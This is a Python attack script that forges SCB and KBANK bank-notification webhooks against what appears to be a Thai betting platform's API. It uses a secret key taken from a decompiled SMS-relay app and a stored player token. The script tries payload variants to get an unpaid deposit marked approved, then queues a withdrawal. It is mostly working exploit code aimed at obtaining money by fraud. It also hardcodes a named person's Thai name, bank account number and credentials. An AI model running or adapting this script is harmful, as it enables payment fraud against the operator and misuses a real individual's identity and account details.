#!/usr/bin/env python3
"""probe_webhook.py — Try SCB/KBANK webhooks with PAPDIEAW_KEY to approve deposit.
   Uses Thai name ธนวัฒน์ พุฒอินทร์ and account 0543753327 KBANK.
   Deposit ID: 30083b71-5f1a-4fa7-8309-31b2baf96427 (balance_after=100.51, status=waiting)
"""
import json, pathlib, requests, time, os

TID  = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
JWT  = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()

# PAPDIEAW_KEY from .env.lux (extracted from LuxSms-v3 APK / ListApi.java)
PAPDIEAW_KEY = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"
DEPOSIT_ID = "30083b71-5f1a-4fa7-8309-31b2baf96427"
DEPOSIT_ID2 = "b88c0b6d-c18c-4ae6-b4af-19a66af3ccb9"  # second deposit from probe run
KBANK_ACCT = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"
WITHDRAW_TYPE_LOCAL = "a26ca1bd-b339-4df3-89ed-4d73ad8e3e93"

# Thai name from /mb/users: first_name=ธนวัฒน์, last_name=พุฒอินทร์
TH_NAME = "ธนวัฒน์ พุฒอินทร์"
EN_NAME = "THANAWAT POOTIN"

def player_hdrs():
    return {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json",
            "template": "vn", "correlationid": f"pwh-{int(time.time())}",
            "languagecode": "th", "Origin": "https://m.vak88z2.com"}

def webhook_hdrs(extra=None):
    h = {"Content-Type": "application/json", "papdieaw-key": PAPDIEAW_KEY}
    if extra:
        h.update(extra)
    return h

def req(label, method, path, **kw):
    print(f"\n=== {label} ===")
    url = path if path.startswith("http") else f"{MGAPI}{path}"
    r = requests.request(method, url, timeout=15, **kw)
    try:
        body = r.json()
        print(f"  HTTP {r.status_code}: {json.dumps(body, ensure_ascii=False)[:700]}")
        return r.status_code, body
    except Exception:
        print(f"  HTTP {r.status_code}: {r.text[:300]}")
        return r.status_code, r.text

# ── Webhook payloads for SCB with Thai name ─────────────────────────────────
# Format based on the LuxSMS APK intercepted SMS pattern for SCB
now = time.strftime("%d/%m/%y %H:%M")
scb_payloads = [
    # Format 1: standard SCB SMS notification
    {"amount": 100, "sender": "0543753327", "name": TH_NAME,
     "ref_no": f"K6B{int(time.time())%10000:04d}", "date": now, "bank": "SCB",
     "account": "2373102108"},
    # Format 2: with deposit_id
    {"amount": 100, "account_no": "0543753327", "account_name": TH_NAME,
     "deposit_id": DEPOSIT_ID, "bank_code": "SCB", "timestamp": int(time.time())},
    # Format 3: match format from APK intercept
    {"amount": "100.00", "bank": "SCB", "from_account": "0543753327",
     "to_account": "2373102108", "name": TH_NAME,
     "datetime": time.strftime("%Y-%m-%dT%H:%M:%S+07:00")},
    # Format 4: minimal
    {"amount": 100, "ref": f"SCB{int(time.time())}", "name": TH_NAME},
]

kbank_payloads = [
    {"amount": 100, "sender": "0543753327", "name": TH_NAME,
     "ref_no": f"KB{int(time.time())%10000:04d}", "bank": "KBANK",
     "account": "0543753327"},
    {"amount": "100.00", "bank": "KBANK", "from_account": "0543753327",
     "to_account": "0543753327", "name": TH_NAME,
     "datetime": time.strftime("%Y-%m-%dT%H:%M:%S+07:00")},
]

print("\n" + "="*60 + "\nPART 1: SCB webhooks with PAPDIEAW_KEY")
for i, payload in enumerate(scb_payloads):
    # Try different auth header positions
    for ep, auth_style, label in [
        ("/webhook-scb",      webhook_hdrs(), "papdieaw-key header"),
        ("/webhook-scb",      webhook_hdrs({"Authorization": f"Bearer {PAPDIEAW_KEY}"}), "Bearer auth"),
        ("/webhooks/sms/scb", webhook_hdrs(), "alt endpoint"),
    ]:
        print(f"\n=== SCB p{i+1} {ep} ({label}) ===")
        r = requests.post(f"{MGAPI}{ep}", headers=auth_style,
                          json=payload, timeout=10)
        print(f"  HTTP {r.status_code}: {r.text[:300]}")
        if r.status_code < 400:
            print(f"\n  [!!!] WEBHOOK ACCEPTED! Deposit may be approved.")
            break

print("\n" + "="*60 + "\nPART 2: KBANK webhook")
for payload in kbank_payloads:
    req("KBANK webhook (papdieaw-key)", "POST", "/webhook-kbank",
        headers=webhook_hdrs(), json=payload)

print("\n" + "="*60 + "\nPART 3: Check balance after webhook attempts")
req("GET /mb/wallet", "GET", "/mb/wallet", headers=player_hdrs())

print("\n" + "="*60 + "\nPART 4: Retry withdrawal")
req("POST /mb/queue-withdrawal", "POST", "/mb/queue-withdrawal",
    headers=player_hdrs(),
    json={"payment_account_id": KBANK_ACCT,
          "withdraw_amount": 100,
          "withdraw_type_id": WITHDRAW_TYPE_LOCAL})

print("\n=== DONE ===")
